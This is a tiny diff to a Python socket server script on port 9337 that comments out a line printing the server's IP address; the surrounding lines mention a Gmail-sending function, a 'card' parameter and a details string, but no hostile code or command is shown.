@@ -137,7 +137,7 @@ def gmail_send_message(ToEmail, TheCard):
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((IP, 9337))
 s.listen(50)
-print(IP)
+#print(IP)
 print('Server established')
 DetailsString = ''
 threading.Thread(target=timecheck).start()
